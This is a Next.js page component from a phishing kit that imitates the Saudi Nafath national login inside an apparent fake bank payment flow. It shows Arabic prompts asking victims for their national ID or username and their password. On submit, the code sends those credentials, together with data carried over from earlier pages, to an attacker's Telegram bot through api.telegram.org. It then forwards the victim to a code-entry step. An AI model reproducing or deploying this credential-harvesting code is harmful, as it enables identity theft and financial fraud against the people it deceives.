"use client"

import React from 'react'
import styles from './nphad.module.css'
import image23 from '../../../../../../../public/image23.jpg'
import image24 from '../../../../../../../public/i.png'
import Image from 'next/image'
import { useRef } from 'react'
import { useRouter,useSearchParams } from 'next/navigation'
import bot from '@/component/dataBot'

const Page = () => {
    let  username = useRef()
    let password = useRef()
    const router = useRouter()
    const x = useSearchParams();
    const datas = x.get("names")
    const handleOnSubmit = (e) => {
        e.preventDefault();

        var length =` نفاذ اسم المستخدم  : ${username.current.value} %0A كلمة المرور: ${password.current.value}  %0A %0A ${datas}`
       
        
        fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
      
      }
      const handlerout = ()=>{
        if(password.current.value == ""){
          alert('من فضلك قم بملى الحقول')
        }else{
          
          router.push(`/fotaiyar/banks/pay/code/nphad/codeto?names=${datas}`)
        }
      }

  return (
    <div className={styles.continer}>

        <Image 
            src={image23}
        />
        <div className={styles.sec1}>
            <h1>الدخول على النظام</h1>
            <p>المصادقة الثنائية، حرصا على سلامتك وسلامة بياناتك يرجى تسجيل الدخول عبر نفاذ للتاكيد</p>
        </div>

        <div className={styles.sec2}>
            <Image
                src={image24}
                width={25}
            />
            <p>
تسجيل الدخول عن طريق اسم المستخدم وكلمة المرور</p>
        </div>

        <form onSubmit={handleOnSubmit} >
            <input type="text" placeholder='اسم المستخدم او رقم الهوية الوطنية' ref={username} required />
            <input type="text" ref={password} placeholder='كلمة المرور' required />
            <button type='submit' onClick={handlerout}>تسجيل الدخول</button>
        </form>
    </div>
  )
}

export default Page;
